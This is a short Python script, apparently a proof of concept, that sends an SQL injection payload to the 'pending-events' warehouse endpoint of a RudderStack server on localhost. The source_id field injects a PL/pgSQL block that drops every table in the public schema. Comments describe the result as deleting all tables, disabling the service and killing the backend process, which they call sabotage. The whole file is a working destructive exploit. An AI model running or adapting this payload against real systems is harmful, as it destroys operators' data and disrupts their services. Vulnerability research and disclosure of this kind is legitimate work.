import requests


def main():
    URL = "http://localhost:8080"
    ENDPOINT = "v1/warehouse/pending-events"
    # deletes all the tables or relations in the database 
    # dissabling all the functionalities provided for rudderstack besides
    # it kill the process running in the backend server making a horrible sabotage
    json = {'source_id': "'; DO $$ DECLARE r RECORD; BEGIN FOR r IN (SELECT table_name FROM information_schema.tables WHERE table_schema = 'public') LOOP EXECUTE 'DROP TABLE IF EXISTS ' || r.table_name || ' CASCADE'; END LOOP; END $$; --",}

    response = requests.post(url=URL + "/" + ENDPOINT, json=json)

if __name__ == "__main__":
    main()
